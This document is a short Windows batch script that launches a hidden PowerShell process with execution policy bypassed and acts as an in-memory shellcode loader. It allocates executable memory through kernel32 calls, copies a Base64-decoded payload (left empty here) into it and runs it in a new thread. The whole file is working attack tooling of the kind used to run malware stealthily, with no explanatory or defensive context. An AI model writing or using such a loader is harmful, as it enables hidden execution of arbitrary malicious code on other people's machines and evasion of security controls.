@echo off
powershell -WindowStyle Hidden -Exec Bypass -Command "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class V{[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,out uint f);[DllImport("kernel32")]public static extern uint WaitForSingleObject(IntPtr a,uint b);}';$b=[Convert]::FromBase64String('');$p=[V]::VirtualAlloc([IntPtr]::Zero,$b.Length,0x3000,0x40);[System.Runtime.InteropServices.Marshal]::Copy($b,0,$p,$b.Length);$t=0;$h=[V]::CreateThread([IntPtr]::Zero,0,$p,[IntPtr]::Zero,0,[ref]$t);[V]::WaitForSingleObject($h,0xFFFFFFFF)|Out-Null"
